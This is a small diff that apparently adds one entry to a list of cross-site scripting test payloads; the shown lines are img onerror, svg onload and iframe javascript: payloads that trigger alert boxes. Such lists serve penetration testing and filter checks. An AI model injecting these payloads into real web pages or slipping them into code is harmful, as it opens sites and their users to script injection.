@@ -7,3 +7,4 @@
 <img/src=x onerror=alert(1)>
 <svg/onload=alert(1)>
 <iframe src="\x01javascript:alert(0)"></iframe> <!-- Example for Chrome -->
+<img/src=x onerror=alert("XSS peru")>
